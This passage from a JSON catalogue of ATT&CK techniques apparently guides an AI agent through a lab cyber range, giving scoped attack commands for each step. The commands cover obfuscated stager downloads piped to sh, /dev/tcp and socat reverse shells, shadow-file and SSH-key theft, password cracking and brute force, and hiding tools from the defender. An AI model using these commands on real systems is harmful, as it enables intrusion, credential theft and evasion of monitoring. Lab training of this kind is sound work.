          "ls -l /etc/cron* /etc/cron.d/ /var/spool/cron/ 2>/dev/null",
          "cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -v '^#'",
          "find /etc/cron* -writable -type f 2>/dev/null"
        ],
        "scope_notes": "IN scope: reading cron/cron.d schedules and identifying world-/group-writable files that a root cron job invokes on the engagement target (passive recon). OUT of scope: actually writing a payload into a cron-driven script, adding new root cron entries, or scheduling execution — that crosses from discovery into persistence/destructive change and must be flagged rather than executed unless explicitly authorized."
      },
      {
        "id": "T1087.001",
        "name": "Local Account",
        "description": "Adversaries enumerate local users and groups to identify high-value targets, privileged group members, service accounts, and shared credentials — the reconnaissance step that selects the privesc path. While classified under Discovery, it is the prerequisite that makes account-based privilege escalation possible.",
        "typical_commands": [
          "cat /etc/passwd /etc/group 2>/dev/null",
          "last -n 20 2>/dev/null",
          "w; who; whoami; id"
        ],
        "scope_notes": "IN scope: read-only enumeration of users, groups, login history, and current sessions on the single engagement target. OUT of scope: enumerating accounts on other hosts, writing/spraying credentials, or exfiltrating password/hash files off the box. All commands must be local to the in-scope host."
      }
    ]
  },
  {
    "id": "TA0005",
    "name": "Defense Evasion",
    "phase": 6,
    "description": "The adversary tries to avoid being detected by defensive sensors (e.g., SLIPS IDS, the soc_god defender) and forensic analysis on the scoped lab hosts. This includes masquerading tooling as legitimate binaries, removing indicators of compromise, hiding artifacts, and executing commands indirectly to slip past signature and behavioral detections.",
    "guidance": "Defense-evasion actions must stay confined to the specific in-scope hosts/CIDR named in the engagement, and every step should be traceable in your session log rather than silently destructive. Good execution means confirming the target is a sanctioned lab asset before touching logs or files, and favoring reversible/non-destructive techniques (rename, copy-aside, decode to /tmp) over wiping evidence that the lab's defender needs to score against. Caution: never mass-delete system logs, wipe auth records across hosts, or disable/uninstall the range's security tooling — that destroys the defender's telemetry and the engagement's scoring signal, and falls outside scope even when technically possible.",
    "techniques": [
      {
        "id": "T1036.003",
        "name": "Rename System Binaries",
        "description": "Adversaries rename or relocate malicious tools and scripts to mimic legitimate system binaries (e.g., naming a payload 'kbdagent' or copying it into /usr/sbin) so that process listings and file paths blend in with normal OS activity.",
        "typical_commands": [
          "cp ./scanner /tmp/.kbdagent && mv /tmp/.kbdagent /tmp/.[a-z]*agent",
          "ln -s /home/opuser/tools/probe /usr/local/bin/syscheckd",
          "install -m 0755 ./relay /var/tmp/.systemd-coredump"
        ],
        "scope_notes": "In scope: copying or symlinking your OWN tooling into /tmp, /var/tmp, or /dev/shm on a specific scoped host, or renaming a binary to test a detection. OUT of scope: overwriting, deleting, or replacing actual system binaries (e.g., /bin/ls, /usr/sbin/sshd) on the target — that is destructive and breaks the lab asset. Do not masquerade as a kernel thread ([kthreadd]) to destabilize host monitoring."
      },
      {
        "id": "T1070.004",
        "name": "File Deletion",
        "description": "Adversaries delete tools, droppers, decoded payloads, and temporary files they placed on the target to remove forensic indicators and hinder analysis after a step completes.",
        "typical_commands": [
          "rm -f /tmp/.scan_results /tmp/payload.b64",
          "find /tmp -maxdepth 1 -name '.apt_*' -user $USER -delete",
          "shred -u /tmp/stager.sh"
        ],
        "scope_notes": "In scope: removing artifacts YOU created during the engagement (your stagers, decoded payloads, scratch files in /tmp or /dev/shm) on a specific host. OUT of scope: deleting system logs (/var/log/*), auth records, shell history of other users, defender alert stores, or any file you did not place — these are the defender's telemetry and are off-limits. Prefer 'shred -u' on your own files over broad 'rm -rf'."
      },
      {
        "id": "T1140",
        "name": "Deobfuscate/Decode Files or Information",
        "description": "Adversaries ship payloads in an encoded form (base64, hex, gzip, XOR) to avoid static signature detection, then decode them into executable form only on the target at runtime.",
        "typical_commands": [
          "echo '<base64>' | base64 -d > /tmp/.probe && chmod +x /tmp/.probe",
          "echo '7f454c46...' | xxd -r -p > /tmp/.stager",
          "gzip -dc encoded.bin.gz > /tmp/.runner"
        ],
        "scope_notes": "In scope: decoding payloads you control into /tmp, /dev/shm, or a scoped working directory on the engagement host for execution. OUT of scope: decoding and writing into system paths (/usr/bin, /etc, /lib), or decoding content sourced from outside the sanctioned engagement. Cap output sizes; do not decode arbitrary attacker-supplied blobs as root."
      },
      {
        "id": "T1564.001",
        "name": "Hidden Files and Directories",
        "description": "Adversaries prefix files and directories with a dot (.) to keep them out of default 'ls' output, placing tooling, configs, and loot in hidden paths under home directories or /tmp to reduce casual discovery.",
        "typical_commands": [
          "mkdir -p ~/.local/.cache && cp probe ~/.local/.cache/.upd",
          "touch /tmp/.results; ls -la /tmp | grep '^-'",
          "install -d /dev/shm/.work && cp ./relay /dev/shm/.work/.svc"
        ],
        "scope_notes": "In scope: creating hidden files/directories to stage YOUR tools or output under the current user's home, /tmp, or /dev/shm on a scoped host. OUT of scope: creating hidden persistence under another user's home, in /etc (e.g., /etc/.hidden), or hiding artifacts from the lab's defender process. Use the dot-prefix only, not privileged system locations."
      },
      {
        "id": "T1202",
        "name": "Indirect Command Execution",
        "description": "Adversaries invoke commands through legitimate interpreters and wrappers (env, nice, nohup, busybox, scripting languages) so the executed payload does not appear as a direct child of a suspicious binary, evading simple process-name and parent-process rules.",
        "typical_commands": [
          "env -i /tmp/.probe target.local",
          "nice -n 19 /tmp/.scanner 10.77.0.5",
          "perl -e 'system(\"/tmp/.relay\")'",
          "/bin/busybox sh -c 'exec /tmp/.probe'"
        ],
        "scope_notes": "In scope: wrapping execution of YOUR tools via an interpreter/wrapper against a specifically scoped target host or single in-scope IP. OUT of scope: using indirect execution to run destructive commands, to pivot beyond the engagement target list, or to deliberately crash/bypass the defender/IDS process itself. Stay within the named target IPs — no indirect invocation of network scans against unscoped subnets."
      },
      {
        "id": "T1027.010",
        "name": "Command Obfuscation",
        "description": "Adversaries obfuscate the command line itself (variable substitution, string concatenation, whitespace/case changes, IFS tricks) so signature-based and bash-history sensors cannot match known-malicious command strings.",
        "typical_commands": [
          "c=cur;l=l; ${c}${l} -fsSL http://10.77.0.5/stager | sh",
          "x='scan'; ${x}ner --target 10.77.0.6",
          "$(echo L2Jpbi9zaA== | base64 -d) -c 'probe target.local'"
        ],
        "scope_notes": "In scope: obfuscating commands that operate only against the scoped engagement hosts (e.g., a single in-scope IP/hostname) to exercise a detection. OUT of scope: using obfuscation to mask out-of-scope actions — mass-scanning, destructive payloads, or fetching from/attacking hosts not in the engagement target list. Obfuscation does not widen scope; the underlying action must still be permitted."
      }
    ]
  },
  {
    "id": "TA0006",
    "name": "Credential Access",
    "phase": 7,
    "description": "Techniques aiming to steal account names and passwords, tokens, SSH keys, or other credential material to gain initial access, elevate privileges, and move laterally across the lab network. In a Linux engagement this centers on reading local credential stores (/etc/shadow, private keys, bash history), recovering plaintext secrets from misconfigured files, and brute-forcing weak services against confirmed in-scope targets.",
    "guidance": "Careful execution means confirming each target host is in the declared engagement scope before touching it, then extracting credential material only from that specific host or service — never running broad sweeps across the subnet or hammering shared infrastructure. Prefer reading existing files and artifacts on already-accessed hosts over network brute force, and when brute force is required, point it at one named service on one scoped host with low thread counts and a small bounded wordlist so you do not lock accounts or trip defensive sensors. Caution: do not crack or exfiltrate credentials that belong to out-of-scope systems, and avoid destructive moves like overwriting /etc/shadow or changing passwords — read, do not modify, credential stores.",
    "techniques": [
      {
        "id": "T1003.008",
        "name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
        "description": "Read the local account database and password hash file to recover usernames, UIDs, and password hashes for offline cracking. /etc/shadow is only readable by root, so it also serves as a privilege-boundary check.",
        "typical_commands": [
          "cat /etc/passwd",
          "sudo cat /etc/shadow",
          "ls -l /etc/passwd /etc/shadow",
          "getent passwd | awk -F: '$3 == 0 {print $1}'  # list root-uid accounts"
        ],
        "scope_notes": "IN scope only on hosts the agent has already accessed within the engagement target (specific host/CIDR) — reading /etc/shadow is a read-only extraction. OUT of scope: attempting to read shadow files via remote exploits against hosts not in the declared target list, or modifying/deleting these files."
      },
      {
        "id": "T1552.001",
        "name": "Unsecured Credentials: Credentials In Files",
        "description": "Search accessible filesystem paths, application configs, and dotfiles for hardcoded passwords, API tokens, database connection strings, and service-account secrets left by administrators.",
        "typical_commands": [
          "grep -rniE 'password|passwd|secret|api[_-]?key|token' /etc /opt /var/www /srv 2>/dev/null | head -50",
          "grep -rniE 'password|pass=' /home --include=*.conf --include=*.env --include=*.yml 2>/dev/null | head -50",
          "find / -maxdepth 4 \\( -name '.env' -o -name '*.conf' -o -name 'config.php' \\) -readable -type f 2>/dev/null | head -50"
        ],
        "scope_notes": "IN scope against the specific engagement host(s) the agent is on, limited to readable config/dotfile inspection. OUT of scope: reading files on out-of-scope mounted shares, or downloading/exfiltrating discovered secrets beyond the minimum needed for the authorized exercise."
      },
      {
        "id": "T1552.004",
        "name": "Unsecured Credentials: Private Keys",
        "description": "Locate unprotected SSH private keys (id_rsa, id_ed25519), TLS/SSL keys, and service certificates that can be reused for lateral movement or impersonation of other lab hosts.",
        "typical_commands": [
          "find / -maxdepth 5 -type f \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' \\) 2>/dev/null | head -50",
          "find /home /root /etc/ssh -type f -name 'id_*' ! -name '*.pub' 2>/dev/null -exec ls -l {} \\;",
          "ssh -i /home/user/.ssh/id_rsa -o StrictHostKeyChecking=accept-new -o BatchMode=yes -o ConnectTimeout=5 <scoped-user>@<scoped-host> 'id; hostname'"
        ],
        "scope_notes": "IN scope: discovering and attempting key-based login only to other hosts explicitly inside the engagement target scope. OUT of scope: reusing recovered keys against any host/CIDR outside the authorized scope, or connecting the key material to external (non-lab) systems."
      },
      {
        "id": "T1552.003",
        "name": "Unsecured Credentials: Bash History",
        "description": "Mine shell history files for commands that embedded passwords, connection strings, or sudo/SQL credentials typed interactively by users or operators.",
        "typical_commands": [
          "cat /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -iE 'password|passwd|mysql|psql|sudo|sshpass|ftp|http' | head -80",
          "for h in /home/*/.bash_history /root/.bash_history; do [ -r \"$h\" ] && grep -iE 'pass|secret|token|key' \"$h\"; done | head -80",
          "ls -la /home/*/.zsh_history /home/*/.python_history /home/*/.mysql_history 2>/dev/null"
        ],
        "scope_notes": "IN scope only on accounts/hosts within the authorized engagement target — read-only history inspection. OUT of scope: accessing history files on out-of-scope users or hosts, or tampering with history to hide activity."
      },
      {
        "id": "T1110.002",
        "name": "Brute Force: Password Cracking",
        "description": "Recover plaintext passwords from hashes captured earlier (/etc/shadow, network captures, databases) using offline dictionary or rule-based cracking so they can be reused against other in-scope services.",
        "typical_commands": [
          "unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt",
          "john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt /tmp/hashes.txt",
          "hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --potfile-disable"
        ],
        "scope_notes": "IN scope: cracking hashes already extracted from in-scope hosts on the local lab machine (offline, no target interaction). OUT of scope: cracking hashes sourced from systems outside the authorized engagement, or using cracked credentials against any non-scoped host."
      },
      {
        "id": "T1110.001",
        "name": "Brute Force: Password Guessing",
        "description": "Attempt a small, bounded set of common or context-derived passwords against a single confirmed in-scope login service (SSH, web login) to gain access to a known account.",
        "typical_commands": [
          "hydra -l <known-user> -P /usr/share/wordlists/fasttrack.txt -t 4 -f -W 1 ssh://<scoped-host>",
          "medusa -u <known-user> -P short-top20.txt -M ssh -h <scoped-host> -T 4",
          "for p in password admin lab2026; do sshpass -p \"$p\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 <known-user>@<scoped-host> 'id' && break; done"
        ],
        "scope_notes": "IN scope: a single named service on one confirmed in-scope host, with low thread counts and a small wordlist to avoid lockouts. OUT of scope: mass-sweeping credentials across the subnet, hitting shared/identity services (LDAP/SSO) outside the target, blind guessing without a known account, or any activity that could lock or disrupt accounts."
      }
    ]
  },
  {
    "id": "TA0007",
    "name": "Discovery",
    "phase": 8,
    "description": "The adversary is trying to figure out the environment — which hosts and services exist, what software is running, what user accounts and processes are present, and how systems are networked together. In a Linux-network lab engagement, Discovery maps the target network, identifies live hosts and open ports, and enumerates the local and remote system context needed to plan the next move.",
    "guidance": "Good Discovery is narrow and confirmatory, not sweeping: start from the engagement target (a specific host or single /24 subnet you were given, e.g. one 10.77.x.0/24) and enumerate only that scope. Prefer targeted probes (single host, top-ports, one service at a time) over broad sweeps; confirm a host is up before deep-scanning it. Caution: never mass-scan ranges outside the declared target CIDR, avoid noisy aggressive timing/OS-detection flags unless required, and treat discovery as read-only — do not enumerate with any tool or payload that could crash, hang, or alter a service.",
    "techniques": [
      {
        "id": "T1046",
        "name": "Network Service Discovery",
        "description": "The adversary scans the target network to identify live hosts and the services (ports) they expose, building a map of what can be reached and potentially exploited.",
        "typical_commands": [
          "nmap -sn 10.77.1.0/24",
          "nmap -sT -T2 --top-ports 20 10.77.1.11",
          "nmap -sV -p 22,80,443 10.77.1.11",
          "for h in 10.77.1.{11..13}; do nmap -sn -n $h; done"
        ],
        "scope_notes": "IN scope: scanning the single engagement subnet or specific target hosts listed in the mission (e.g. one 10.77.x.0/24 and named hosts). OUT of scope: scanning the full RFC1918 space, other topology subnets not in the target list, the 172.25.0.x management/playground network, or the internet. Prefer connect-scan (-sT) and polite timing (-T2/--top-ports) over aggressive -T5/-O/full-range sweeps."
      },
      {
        "id": "T1049",
        "name": "System Network Connections",
        "description": "The adversary inspects current network connections and listening sockets, both to enumerate reachable services on a host and to spot existing sessions worth hijacking or avoiding.",
        "typical_commands": [
          "ss -tunap",
          "ss -tlnp",
          "netstat -antp",
          "lsof -i -P -n"
        ],
        "scope_notes": "IN scope: enumerating sockets on hosts the agent has already accessed (local foothold or an authorized remote target). OUT of scope: using connection lists solely to pivot onto hosts outside the declared target set. These are read-only introspection tools; no network impact expected."
      },
      {
        "id": "T1016",
        "name": "System Network Configuration Discovery",
        "description": "The adversary gathers the host's IP addresses, interfaces, routing table, and DNS/NTP settings to understand network topology, gateways, and how to reach adjacent subnets.",
        "typical_commands": [
          "ip addr show",
          "ip route show",
          "cat /etc/resolv.conf",
          "ip neigh show"
        ],
        "scope_notes": "IN scope: reading interface/routing/DNS config on the agent's foothold host or authorized targets to understand the engagement topology (e.g. confirming the .254 router and sibling subnets). OUT of scope: modifying any of these (route/addr changes are not discovery) or probing gateway/router infrastructure beyond reading its advertised routes. Read commands only."
      },
      {
        "id": "T1082",
        "name": "System Information Discovery",
        "description": "The adversary collects OS, kernel, architecture, and hostname details to fingerprint the target and select compatible tooling, exploits, or privilege-escalation paths.",
        "typical_commands": [
          "uname -a",
          "cat /etc/os-release",
          "hostname; uptime; arch",
          "lsmod | head"
        ],
        "scope_notes": "IN scope: reading OS/kernel facts on the agent's foothold and on explicitly authorized target hosts. OUT of scope: collecting hardware serials, cloud metadata endpoints (169.254.169.254), or host info from systems outside the engagement scope. Strictly read-only commands."
      },
      {
        "id": "T1087",
        "name": "Account Discovery",
        "description": "The adversary enumerates user and group accounts on the system and domain to identify valid usernames, privileges, and likely credential targets for access or brute force.",
        "typical_commands": [
          "cat /etc/passwd",
          "getent passwd",
          "cat /etc/group",
          "last -n 20; who; w"
        ],
        "scope_notes": "IN scope: enumerating local accounts on the agent's foothold host and authorized target hosts only. OUT of scope: enumerating accounts on hosts outside the target set, or attempting any credential guessing/brute force under this technique (that belongs to Credential Access). Passive read of /etc files only."
      },
      {
        "id": "T1057",
        "name": "Process Discovery",
        "description": "The adversary inspects running processes to find security tooling (EDR/defender agents, logging sensors), identify high-privilege or interesting services, and avoid detection.",
        "typical_commands": [
          "ps auxf",
          "ps -eo pid,ppid,user,cmd --sort=-rss | head -40",
          "systemctl list-units --type=service --state=running",
          "ls -la /proc/*/exe 2>/dev/null | head"
        ],
        "scope_notes": "IN scope: listing processes/services on the agent's own foothold host and authorized targets to understand the environment. OUT of scope: enumerating processes on hosts outside scope, or using process info to kill/stop defender or monitoring processes (that is Impact/Defense Evasion, not Discovery). Read-only inspection only."
      }
    ]
  },
  {
    "id": "TA0008",
    "name": "Lateral Movement",
    "phase": 9,
    "description": "Techniques used by an adversary to move through a network environment, entering and controlling remote systems on the lab network using valid credentials, stolen keys, or exploitation of remote services.",
    "guidance": "Confirm each target host is within the engagement scope (specific IPs/hostnames from the topology) before attempting any connection, and prefer stealthy single-host connections over mass network sweeps. Move one host at a time, reuse already-harvested credentials/keys rather than brute-forcing new ones, and treat every login as the start of a new evidence trail to log. Caution: never pivot outside the authorized lab CIDR, do not install persistent backdoors or modify shared infrastructure (e.g. bastion/Jump config, Ansible inventory), and avoid noisy discovery that could trip defender sensors across unrelated hosts.",
    "techniques": [
      {
        "id": "T1021.004",
        "name": "Remote Services: SSH",
        "description": "The adversary uses stolen, guessed, or defaulted SSH credentials to log into another Linux host on the lab network and execute commands, the most common Linux lateral-movement vector.",
        "typical_commands": [
          "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i /tmp/.cache/id_rsa target-user@10.77.0.15 'id; hostname'",
          "sshpass -e ssh -o StrictHostKeyChecking=no target-user@10.77.0.15 'uname -a'   # SSHPASS=... env var",
          "ssh -o ProxyJump=jump@10.77.0.5 -o StrictHostKeyChecking=no app@10.77.0.20 'cat /etc/hostname'"
        ],
        "scope_notes": "IN scope: SSH login to a specific in-scope lab host using credentials/keys already obtained during the engagement. OUT of scope: brute-forcing or spraying SSH across the whole subnet, connecting to hosts outside the engagement CIDR, or altering sshd_config / authorized_keys to establish persistence."
      },
      {
        "id": "T1552.004",
        "name": "Unsecured Credentials: Private Keys",
        "description": "The adversary harvests unencrypted SSH private keys (id_rsa, id_ed25519, deployment keys) from a compromised host and reuses them to authenticate to other systems that trust the corresponding public key.",
        "typical_commands": [
          "find / -maxdepth 5 \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' \\) 2>/dev/null | grep -v '^/usr' | head -20",
          "grep -rE 'ssh-(rsa|ed25519) ' /home /root /tmp 2>/dev/null | head -20   # locate authorized_keys trust paths",
          "chmod 600 /tmp/.c/id_rsa && ssh -o StrictHostKeyChecking=no -i /tmp/.c/id_rsa deploy@10.77.0.30 'id'"
        ],
        "scope_notes": "IN scope: enumerating and reusing private keys found on a host you already control to reach other in-scope lab hosts. OUT of scope: exfiltrating keys to an external system, uploading forged public keys into victim authorized_keys files, or reading keys on hosts not part of the engagement."
      },
      {
        "id": "T1570",
        "name": "Lateral Tool Transfer",
        "description": "The adversary transfers tools, scripts, or implants between compromised lab hosts (e.g. over SCP/rsync/netcat) so they can operate without re-downloading from the internet.",
        "typical_commands": [
          "scp -o StrictHostKeyChecking=no -i /tmp/.c/id_rsa ./probe.sh target-user@10.77.0.15:/tmp/.probe.sh",
          "rsync -e 'ssh -i /tmp/.c/id_rsa -o StrictHostKeyChecking=no' -a ./linenum/ target-user@10.77.0.15:/tmp/.le/",
          "(nc 10.77.0.15 4444 < ./tool.bin > /dev/null 2>&1 &)   # receiver: nc -lp 4444 > tool.bin"
        ],
        "scope_notes": "IN scope: copying your own tools to a specific in-scope destination host you are already authorized on. OUT of scope: pushing tools to hosts outside scope, writing into system/sensitive paths (/etc, /usr/bin) to hide them, or transferring destructive binaries (rm/wipe, cryptominers)."
      },
      {
        "id": "T1210",
        "name": "Exploitation of Remote Services",
        "description": "The adversary exploits a vulnerability in a network service on an internal lab host (web app, database, SMB/NFS, exposed management port) to gain code execution and a foothold on that host.",
        "typical_commands": [
          "nmap -sV -p- --max-rate 1000 -T3 10.77.0.25 -oN /tmp/.c/svc_25.txt   # targeted single host",
          "curl -s --max-time 8 'http://10.77.0.25:8080/admin' | head -40",
          "searchsploit --nmap /tmp/.c/svc_25.xml 2>/dev/null | head -30"
        ],
        "scope_notes": "IN scope: enumerating and exploiting an identified vulnerable service on one specific in-scope lab host. OUT of scope: scanning the entire subnet at once, exploiting services on out-of-scope hosts, or running exploits that crash/DoS the service or corrupt data (prefer read-only / RCE-proof over destructive payloads)."
      },
      {
        "id": "T1552.001",
        "name": "Unsecured Credentials: Credentials In Files",
        "description": "The adversary searches for plaintext credentials left in configuration files, shell history, and backups on a compromised host, then reuses them to move laterally to other services or hosts.",
        "typical_commands": [
          "grep -rEni 'password|passwd|secret|token|api[_-]?key' /etc /opt /var/www /home 2>/dev/null | grep -v '^Binary' | head -30",
          "grep -E '(mysql|psql|ssh|sudo) ' /home/*/.bash_history /root/.bash_history 2>/dev/null | head -30",
          "find / -maxdepth 4 \\( -name '.env' -o -name 'config.yml' -o -name 'wp-config.php' -o -name '*.kdbx' \\) 2>/dev/null | head -20"
        ],
        "scope_notes": "IN scope: searching files on a host you already control for credentials, and reusing them only against in-scope lab services/hosts. OUT of scope: dumping credential stores on out-of-scope hosts, mass-downloading entire /etc or home trees for off-host cracking, or reusing credentials against production/external systems."
      },
      {
        "id": "T1072",
        "name": "Software Deployment Tools",
        "description": "The adversary abuses legitimate deployment/automation tooling present in the lab (Ansible, Chef, Puppet, Kubernetes kubectl) to execute commands or distribute payloads across multiple managed hosts from a single control point.",
        "typical_commands": [
          "ansible all -i /etc/ansible/hosts --list-hosts 2>/dev/null | head -20   # enumerate managed hosts only",
          "ansible webservers -i /etc/ansible/hosts -m command -a 'id; hostname' --become 2>/dev/null | head -40",
          "kubectl --kubeconfig=/etc/kubernetes/admin.conf get nodes 2>/dev/null | head"
        ],
        "scope_notes": "IN scope: enumerating which in-scope lab hosts are managed, then issuing a targeted command to a single host/group. OUT of scope: modifying the deployment inventory/playbooks to inject persistence, pushing changes to hosts outside the engagement, or running mass 'all' executions that alter every system at once."
      }
    ]
  },
  {
    "id": "TA0009",
    "name": "Collection",
    "phase": 10,
    "description": "The adversary is trying to gather data of interest to accomplish their goal. Collection consists of techniques used to identify and gather information, such as sensitive files, from a target network and local or network-attached hosts prior to exfiltration.",
    "guidance": "Collection must be tightly scoped to the specific engagement target host/CIDR and to data explicitly named in the objective (e.g., a flag file, a named credentials file, a single document). Confirm reachability and identity of the target first, then read only what the goal requires — prefer cat/head/grep on specific paths over recursive directory walks or bulk archive-and-download of entire filesystems. Caution: do not deploy persistent keyloggers or packet capture across the whole subnet, do not stage large archives in world-writable locations, and never collect data outside the agreed engagement scope (e.g., unrelated user home dirs, other tenants, production hosts).",
    "techniques": [
      {
        "id": "T1005",
        "name": "Data from Local System",
        "description": "Adversaries search local system sources, such as file systems or configuration databases, to find and collect files of interest such as credentials, SSH keys, bash history, and application configs.",
        "typical_commands": [
          "cat /etc/passwd",
          "ls -la ~/.ssh/ && cat ~/.ssh/id_rsa",
          "cat ~/.bash_history",
          "find /var/www -maxdepth 3 -type f \\( -name '*.conf' -o -name '*.env' \\) 2>/dev/null",
          "grep -rniE 'password|secret|api[_-]?key' /etc/ 2>/dev/null | head -50"
        ],
        "scope_notes": "IN scope: reading specific named files (e.g., /flag.txt, /home/target/.ssh/id_rsa, an objective-named config) on the confirmed engagement host. OUT of scope: recursive greps across the entire filesystem, reading every user's home directory, or collecting data on hosts not in the engagement target list."
      },
      {
        "id": "T1039",
        "name": "Data from Network Shared Drive",
        "description": "Adversaries access network shared drives (NFS, SMB/CIFS) to locate and gather files of interest that are stored on other hosts or shared storage rather than the compromised system.",
        "typical_commands": [
          "showmount -e 10.10.10.5",
          "mount -t nfs -o ro,nolock 10.10.10.5:/shared /mnt/target && ls /mnt/target",
          "smbclient -N -L //10.10.10.5 2>/dev/null",
          "find /mnt/target -maxdepth 2 -type f -name '*.pdf' 2>/dev/null"
        ],
        "scope_notes": "IN scope: enumerating and reading shares on a host explicitly listed in the engagement target, read-only mounts. OUT of scope: scanning the whole subnet for open shares, mounting shares from non-target hosts, write access, or bulk-copying entire shared volumes."
      },
      {
        "id": "T1056",
        "name": "Input Capture",
        "description": "Adversaries capture user input via mechanisms such as keyloggers, X11 event sniffing, or terminal device monitoring in order to collect credentials and other typed data.",
        "typical_commands": [
          "which xinput xev logkeys 2>/dev/null",
          "cat /dev/input/event0 2>/dev/null | head -c 256 | xxd",
          "script -q /tmp/keystrokes.log -c 'sleep 1' 2>/dev/null",
          "ss -lx 2>/dev/null | head -20"
        ],
        "scope_notes": "IN scope: short, demonstrative capture on the single authorized target host where input capture is an explicit objective deliverable. OUT of scope: persistent/background keyloggers, capturing input on multi-user systems without explicit scope authorization, or capturing credentials of users outside the engagement."
      },
      {
        "id": "T1560",
        "name": "Archive Collected Data",
        "description": "Adversaries compress and package collected data into archives (tar, zip, gzip) to make it easier to stage and exfiltrate from the target environment.",
        "typical_commands": [
          "tar czf /tmp/collection.tar.gz -C /home/target .bash_history .ssh/",
          "zip -r /tmp/out.zip /var/www/config/ 2>/dev/null",
          "tar tf /tmp/collection.tar.gz",
          "ls -lh /tmp/collection.tar.gz"
        ],
        "scope_notes": "IN scope: creating a small archive of already-collected in-scope files in /tmp on the engagement host for staging. OUT of scope: archiving entire home directories or filesystem partitions, staging archives in world-writable shared locations, or any exfiltration to systems outside the lab."
      },
      {
        "id": "T1119",
        "name": "Automated Collection",
        "description": "Adversaries use scripts and automated methods to systematically locate and collect files of interest based on criteria such as file type, name, size, or content, rather than manual searching.",
        "typical_commands": [
          "find /home -maxdepth 3 -type f \\( -name 'id_rsa' -o -name '*.kdbx' -o -name '.env' \\) 2>/dev/null",
          "find / -maxdepth 4 -type f -size -2M \\( -name '*.pdf' -o -name '*.docx' \\) 2>/dev/null | head -50",
          "locate -i 'backup' 2>/dev/null | head -20",
          "grep -rl 'BEGIN RSA PRIVATE KEY' /etc /home 2>/dev/null | head -20"
        ],
        "scope_notes": "IN scope: a bounded, depth-limited automated search constrained to the engagement host and to objective-relevant file types/names. OUT of scope: unbounded full-filesystem recursion, unconstrained content greps, or running automated collection against hosts outside the scoped target list."
      },
      {
        "id": "T1213",
        "name": "Data from Information Repositories",
        "description": "Adversaries gather data from information repositories such as code repos (Git), wikis, databases, or internal documentation sites that may hold credentials, architecture details, or other sensitive notes.",
        "typical_commands": [
          "find / -maxdepth 4 -name '.git' -type d 2>/dev/null | head -10",
          "git -C /opt/app log --oneline -5 2>/dev/null",
          "git -C /opt/app show HEAD:config/database.yml 2>/dev/null",
          "find /var/www -maxdepth 3 -name '*.sqlite' -o -name '*.db' 2>/dev/null | head -10"
        ],
        "scope_notes": "IN scope: reading objective-relevant committed files or local DBs on the confirmed engagement host (e.g., a config file in an in-scope repo). OUT of scope: cloning repositories to an external machine, dumping entire databases, or accessing information repositories hosted on non-target systems."
      }
    ]
  },
  {
    "id": "TA0011",
    "name": "Command and Control",
    "phase": 11,
    "description": "The adversary tries to communicate with systems under their control within a victim network to relay commands and receive exfiltrated data. Tactic TA0011 covers the channels, protocols, and encodings used to maintain a back-channel to compromised hosts.",
    "guidance": "Establish C2 only against the single, confirmed engagement target (a host/CIDR named in the scope), and prefer standard protocols on already-authorized ports (e.g., HTTPS/443, DNS/53, SSH/22) so traffic blends with normal lab noise. Stand up the listener on an operator-owned box inside the authorized range first, verify the one-sided reverse connection lands, then exercise a single low-impact command before scaling. Caution: never point a beacon, proxy, or tunnel at systems outside the named target, do not enable mass-scanning or netflow-spamming retry loops, and avoid any command that deletes, encrypts, or denies service — C2 here is for access and data movement only, not impact.",
    "techniques": [
      {
        "id": "T1071.001",
        "name": "Application Layer Protocol: Web Protocols",
        "description": "Use HTTP/HTTPS to blend C2 traffic with normal web browsing. The agent runs a listener and a compromised host beacons back over port 80/443, carrying commands and replies in the HTTP body or headers.",
        "typical_commands": [
          "python3 -m http.server 8080 --bind 10.77.0.5",
          "curl -sk -A 'Mozilla/5.0' https://10.77.0.5:443/beacon --data @payload.bin",
          "openssl s_server -quiet -key server.key -cert server.crt -accept 443 -WWW",
          "while true; do curl -sk https://10.77.0.5:443/c -A 'Updater/1.0'; sleep 30; done"
        ],
        "scope_notes": "Listener must bind to the operator's own authorized host only; the single beacon target must be the named engagement host. Do not beacon to, or pull stagers from, any external/internet C2 or any host outside scope."
      },
      {
        "id": "T1071.004",
        "name": "Application Layer Protocol: DNS",
        "description": "Tunnel C2 through DNS queries and responses to bypass egress filtering that allows name resolution. Sub-domains encode data; TXT/A records carry the return channel.",
        "typical_commands": [
          "dig +short txt c2cmd.lab-range.local @10.77.0.2",
          "dnscat2 10.77.0.2 --domain lab-range.local --dns server=10.77.0.2",
          "python3 dns_tunnel.py --server 10.77.0.2 --domain lab-range.local"
        ],
        "scope_notes": "DNS server must be the authorized in-range resolver (e.g., the lab's 10.77.0.2). Send a few representative queries to the engagement host only — never run a bulk DNS-tunnel that floods the resolver or queries public resolvers/real domains."
      },
      {
        "id": "T1095",
        "name": "Non-Application Layer Protocol",
        "description": "Use raw TCP, UDP, or ICMP as a C2 channel when no application-layer protocol is convenient. Useful for a lightweight shell on a stripped-down Linux box.",
        "typical_commands": [
          "nc -lvnp 4444 -s 10.77.0.5",
          "bash -c 'exec 3<>/dev/tcp/10.77.0.5/4444; cat <&3 | bash 2>&1 >&3'",
          "socat TCP-LISTEN:4445,bind=10.77.0.5,reuseaddr,fork EXEC:bash",
          "ping -c 1 -p $(echo -n id | xxd -p) 10.77.0.5"
        ],
        "scope_notes": "Bind listeners to the operator's authorized IP; the /dev/tcp or ping back-connect may target only the named engagement host. The ICMP encoding variant sends a single packet to demonstrate the channel — no ICMP flood or sweep."
      },
      {
        "id": "T1571",
        "name": "Non-Standard Port",
        "description": "Carry C2 over a port that does not match its usual protocol (e.g., shell on 53/443/8080) to slip past simple port-based egress rules.",
        "typical_commands": [
          "nc -lvnp 443 -s 10.77.0.5",
          "socat TCP-LISTEN:53,bind=10.77.0.5,reuseaddr EXEC:/bin/bash",
          "ssh -p 53 -N -R 9001:localhost:22 operator@10.77.0.5"
        ],
        "scope_notes": "In scope when testing egress from the single engagement host toward the operator's authorized box. Out of scope: connecting to third-party services, internet hosts, or any non-target on these alternate ports."
      },
